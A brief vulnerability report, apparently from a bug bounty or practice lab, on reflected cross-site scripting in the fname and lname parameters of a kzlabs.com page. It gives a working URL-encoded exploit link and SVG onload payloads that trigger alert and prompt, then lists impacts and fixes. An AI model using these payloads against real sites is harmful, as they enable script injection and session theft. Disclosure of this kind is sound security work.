## Title
Reflected Cross-Site Scripting (XSS) in `fname` and `lname` Parameters

## Summary
Reflected XSS vulnerability in:
`https://kzlabs.com/punishment/6.php`

## Steps to Reproduce
1. Open the following URL:
`https://kzlabs.com/punishment/6.php?fname=%22%3E%3Cdatalist+id%3Dx%3E%3Coption+value%3Dx%3E%3CsVg+onload%3Dalert%28%22OHHH%22%29%3E&lname=%22%3E%3CsVg%2Fonload%3Dprompt%28%22QQQQ%22%29%3E`

2. Observe execution.

## Payload Used
`"><datalist id=x><option value=x><sVg onload=alert("OHH")>`

## Proof of Concept
## Screenshot — Vulnerable application confirming XSS execution
<img width="1911" height="824" alt="image" src="https://github.com/user-attachments/assets/b55a7c45-9e8a-4396-8fd6-baccbcfccff0" />


## Impact
- Cookie theft
- Session hijacking
- JS execution

## Recommendations for Fix
- Encode output
- Validate input
- Avoid unsafe sinks
